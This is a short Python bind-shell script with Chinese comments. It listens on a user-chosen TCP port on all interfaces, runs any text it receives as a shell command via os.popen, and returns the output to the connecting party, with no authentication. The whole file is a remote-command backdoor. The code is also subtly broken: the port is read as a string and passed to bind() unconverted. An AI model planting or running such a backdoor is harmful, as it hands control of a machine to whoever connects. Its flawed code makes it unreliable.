# coding=utf-8
# python3
# by 此意系

import socket
import os

ip = ""  # 空表示可连接所有主机
port = input("请输入开放的端口:") # 设置端口

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      #  对象s 使用基于tcp协议的网络套接字
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 关闭后不需要保存状态可以立即开启
s.bind((ip, port))  # 对象s 开始绑定ip和端口
s.listen(10)  # 启动监听状态，设置队列中等待连接服务器的最大请求数10

conn, addr = s.accept()  # 当与别人建立连接 addr,conn 变量分别存对方ip和连接的对象
print(addr)  # 显示对方地址

while True:
    data = conn.recv(1024)  # 接收对方字符串 #如果对方不发数据会卡住
    print(data)  # 打印对方发来的数据
    if data == b"q":
        break
    data = str(data, encoding="utf8")  # 将数据转换为字符串类型
    f = os.popen(data)  # 可以将命令的内容以读取的方式返回
    data2 = f.read()
    if data2 == "":
        conn.send(b"finish")
    else:
        conn.send(bytes(data2, encoding="utf8"))  # 发送命令运行结果

conn.close()  # 断开连接
s.close()  # 关闭套结字
